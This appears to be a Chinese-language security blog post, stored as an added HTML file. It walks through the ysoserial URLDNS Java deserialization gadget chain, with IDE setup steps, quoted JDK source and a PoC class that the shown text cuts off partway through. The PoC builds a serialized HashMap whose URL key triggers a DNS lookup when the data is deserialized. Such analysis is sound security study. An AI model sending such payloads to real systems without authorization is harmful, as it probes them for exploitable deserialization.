@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/upload/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/upload/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/upload/favicon-16x16.png">
+  <link rel="mask-icon" href="/upload/kaoruko.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="java反序列化-URLDNS利用链分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="URLDNS利用链分析">
+<meta property="og:url" content="https://hllttz.github.io/2025/10/27/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="hllttz&#39;s blog">
+<meta property="og:description" content="java反序列化-URLDNS利用链分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251025214036745.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251025214513711.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251025214824453.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251025235837120.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251025235950477.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251026000022227.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251026000212475.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20251026000606818.png">
+<meta property="article:published_time" content="2025-10-27T13:47:57.000Z">
+<meta property="article:modified_time" content="2025-10-27T13:53:53.361Z">
+<meta property="article:author" content="hllttz">
+<meta property="article:tag" content="java,java反序列化,URLDNS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hllttz.github.io/images/image-20251025214036745.png">
+
+
+<link rel="canonical" href="https://hllttz.github.io/2025/10/27/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hllttz.github.io/2025/10/27/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","path":"2025/10/27/URLDNS利用链分析/","title":"URLDNS利用链分析"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>URLDNS利用链分析 | hllttz's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">hllttz's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">17</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">15</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">20</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ysoserial-URLDNS%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">ysoserial URLDNS分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%89%8D%E5%87%86%E5%A4%87"><span class="nav-number">1.1.</span> <span class="nav-text">调试前准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">hllttz</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hllttz.github.io/2025/10/27/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hllttz">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hllttz's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="URLDNS利用链分析 | hllttz's blog">
+      <meta itemprop="description" content="java反序列化-URLDNS利用链分析">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          URLDNS利用链分析
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-10-27 21:47:57 / 修改时间：21:53:53" itemprop="dateCreated datePublished" datetime="2025-10-27T21:47:57+08:00">2025-10-27</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/java-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">java,java反序列化</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>6.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">java反序列化-URLDNS利用链分析</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="ysoserial-URLDNS分析"><a href="#ysoserial-URLDNS分析" class="headerlink" title="ysoserial URLDNS分析"></a>ysoserial URLDNS分析</h1><h2 id="调试前准备"><a href="#调试前准备" class="headerlink" title="调试前准备"></a>调试前准备</h2><p>ysoserial 项目地址： <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/">https://github.com/frohoff/ysoserial/</a> ，git clone 或直接下载下来导入IDEA中</p>
+<p>ysoserial 项目结构如下，在 payloads 目录中可以看到 ysoserial 中所有的可利用类。</p>
+<p><img src="/images/image-20251025214036745.png" alt="image-20251025214036745"></p>
+<p>ysoserial 项目中存在 pom.xml 文件，表明这是一个由 maven 构建的项目。IntelliJ IDEA 会自动根据其中的配置下载依赖。</p>
+<blockquote>
+<p>POM（Project Object Model，即项目对象模型）是 Maven 工程的基本工作单元，是一个 XML 文件，包含了 Maven 用于构建项目的项目信息及各种配置信息，比如项目依赖，项目开发人员，版本，插件，组织信息、项目授权、项目的 url 等等。我们通过 POM 文件来完成对 Maven 项目的管理，构建等操作。</p>
+</blockquote>
+<p>pom.xml 文件中 <code>maven-assembly-plugin</code> 就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。其中存在 <code>&lt;mainClass&gt;</code>，表明 <code>ysoserial.GeneratePayload</code> 就是主类。</p>
+<p><img src="/images/image-20251025214513711.png" alt="image-20251025214513711"></p>
+<p>根据 pom.xml 中的 <code>&lt;mainClass&gt;</code> 找到找到 <code>GeneratePayload</code> 类</p>
+<p><img src="/images/image-20251025214824453.png" alt="image-20251025214824453"></p>
+<p>如果 maven 依赖有问题，可以手工点击菜单里的<code>文件</code>-&gt;<code>项目结构</code>-&gt;<code>新建项目库</code>-&gt;<code>来自maven</code></p>
+<p><img src="/images/image-20251025235837120.png" alt="image-20251025235837120"></p>
+<p>输入需导入的包名，等待搜索完成，再选择相应的版本下载即可。</p>
+<p><img src="/images/image-20251025235950477.png" alt="image-20251025235950477"></p>
+<p><code>main</code> 函数前有个绿色的小箭头，点击这个小箭头可选择从此 Debug（ 因为一个项目中可能存在多个 <code>main</code> 函数，所以通过这种方法快速找到运行时的主类）</p>
+<p><img src="/images/image-20251026000022227.png" alt="image-20251026000022227"></p>
+<p>此时直接开始调试只会在控制台中发现usage信息，ysoserial 需要添加参数来运行指定的 payloads 模块。</p>
+<p>所以需要修改默认参数。修改路径&#x2F;方法如下。打开 IDEA 右上角的编辑配置</p>
+<p><img src="/images/image-20251026000212475.png" alt="image-20251026000212475"></p>
+<p>然后再程序实参中输入参数<code>URLDNS &quot;&lt;http://xxx.com&gt;&quot;</code>这样就完成了调试前的准备</p>
+<p><img src="/images/image-20251026000606818.png" alt="image-20251026000606818"></p>
+<p>##反序列化过程调试</p>
+<p>ysoserial中列出的Gadget如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理:</strong></p>
+<p><code>java.util.HashMap</code>重写了<code>readObject</code>，在反序列化的时候会调用<code>hash</code>函数计算key的hashCode。而<code>java.net.URL</code>的hashCode在计算时会调用<code>getHostAddress</code>来解析域名，从而发出DNS请求</p>
+<p>在HashMap.java文件中，存在重写了的<code>readObject</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="comment">//读取传入的输入流,对传入的序列化数据进行反序列化</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>关注最后的<code>putVal</code>方法，<code>putVal</code>是<code>HashMap</code>中放入键值对的方法。跟进hash函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);<span class="comment">//key为null,key赋值为0,否则进行冒号之后的运算</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>key.hashCode</code>方法，此时的key正是我们传进来的<code>java.net.URL</code>对象。那么跟进到这个类的hashCode()方法看下</p>
+<p>URL::hashCode</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;<span class="comment">// synchronized 关键字修饰的方法为同步方法。当synchronized方法执行完或发生异常时，会自动释放锁。</span></span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>hashCode</code> 已经被计算过（不等于初始值 -1），直接返回缓存值，将实际的哈希计算委托给 <code>handler</code> 对象的 <code>hashCode</code> 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>
+
+<p>此处 <code>handler</code> 是 <code>URLStreamHandler</code> 的一个对象，由 <code>transient URLStreamHandler handler</code> 创建。继续步进 <code>hashCode</code> 方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到用于获取URL对应的IP地址的这么一行代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进<code>getHostAddress</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);<span class="comment">//进行dns查询</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这⾥ <code>InetAddress.getByName(host)</code> 的作⽤是根据主机名，获取其 IP 地址，在⽹络上就是⼀次 DNS 查询。</p>
+<p>##构造调用链</p>
+<p>调用链如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap -&gt; readObject()</span><br><span class="line">HashMap -&gt; hash()</span><br><span class="line">URL -&gt; hashCode()</span><br><span class="line">URLStreamHandler -&gt; hashCode()</span><br><span class="line">URLStreamHandler -&gt; getHostAddress()</span><br><span class="line">InetAddress -&gt; getByName()</span><br></pre></td></tr></table></figure>
+
+<p>要构造这个利用链，需要初始化一个<code>java.net.URL</code>对象，作为key放在<code>java.util.HashMap</code>中。然后，设置这个对象的<code>hashCode</code>的初始值为-1，这样反序列化时将会重新计算其hashCode，才有后面的DNS请求的事情。可以通过反射来修改这个字段的值</p>
+<p>完整poc如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> poc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException,IllegalAccessException,NoSuchFieldException&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">URL</span>(<span 